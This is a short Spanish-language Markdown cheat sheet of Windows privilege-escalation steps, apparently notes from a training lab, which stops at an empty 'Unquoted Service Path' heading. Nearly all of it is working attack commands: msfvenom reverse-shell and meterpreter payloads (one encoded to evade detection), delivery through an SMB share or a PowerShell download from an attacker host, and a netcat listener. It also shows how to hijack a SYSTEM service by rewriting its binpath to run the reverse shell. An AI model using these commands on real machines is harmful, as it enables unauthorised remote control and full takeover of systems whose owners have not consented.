# Privilege Escalation

## Reverse Shell

- Generamos un reverse shell con msfvenom
  
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.145.69 lport=53 -f exe -o reverse.exe
```

```bash
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.6.4.115 LPORT=4444 -f exe -o shell.exe
```

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.6.4.115 lport=4444 -f aspx -o shell.aspx
```



- Ponemos un servidor impacket

```shell
/usr/local/bin/smbserver.py kali .
```

- Copiar el revershell a la paquina con windows

```bash
copy \\10.10.145.69\kali\reverse.exe .
```

- Otra opcion es un servdor http y luego descargarlo con windows

```shell

```

```cmd
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.4.115/shell.exe')"
```

```cmd
powershell Invoke-WebRequest -Uri http://10.6.4.115/shell.exe -Outfile shell.exe
```

```cmd
powershell Invoke-WebRequest -Uri http://10.6.4.115/winPEAS.bat -Outfile winPEAS.bat 
```

## Service Exploits - Insecure Service Permissions

- Revisar los permisos de un usuario sobre un servicio determinado y vemos que lo puede modificar en su configuracion

```cmd
 accesschk.exe /accepteula -uwcqv user daclsvc
```

- Consultamos el servicio y vemos que corre como system
  
```cmd
sc qc daclsvc
```

- Modficamos la ruta del servicio para apuntarlo a nuestro reverse shell
  
```cmd
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

- Ponemos escucha en kali
  
```bash
nc -lnvp 4444
```

- Iniciamos el servicio en windows

```cmd
net start daclsvc
```

https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

## Service Exploits - Unquoted Service Path

